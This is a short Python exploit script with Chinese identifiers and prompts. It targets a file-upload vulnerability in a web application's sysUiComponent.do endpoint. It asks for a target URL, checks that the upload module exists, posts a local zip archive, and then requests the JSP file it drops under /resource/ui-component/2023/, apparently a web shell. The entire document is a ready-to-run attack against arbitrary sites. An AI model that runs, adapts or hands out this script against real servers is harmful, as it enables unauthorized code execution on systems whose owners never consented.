import requests
import time

print("请输入url：\n结尾不带 ‘\’    例如：http://www.test.com")
初始url = input().split()
验证url = 初始url[0] + f"/sys/ui/sys_ui_component/sysUiComponent.do?method=upload"
上传url = 初始url[0] + f"/sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true"
payload = {'file':open('cs.zip','rb')} #以二进制读取
请求头 = {
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
}
#print(响应.elapsed.total_seconds())
#漏洞验证函数
def 验证(url):
    响应  = requests.get(url,headers=请求头,verify=False)
    return 响应

#文件上传函数
def 文件上传(url):
    响应 = requests.post(url,headers=请求头,files=payload,verify=False)
    if 'directoryPath' in 响应.text:
        print("文件上传成功",响应.text)
        上传路径 = 初始url[0] + '/resource/ui-component/2023/text.jsp'
        print("上传地址为：",上传路径)
        上传验证 = requests.get(上传路径,headers=请求头,verify=False)
        if 上传验证.status_code != 200:
            print("上传文件解析不成功")
    else:
        print("文件上传不成功")
    
#主函数
def main():
    响应 = 验证(验证url)
    if 响应.status_code == 200:
        print("文件上传模块存在")
        time.sleep(2)
        文件上传(上传url)
    else:
        print("文件上传模块不存在，漏洞不存在")



if __name__ == '__main__':
    main()
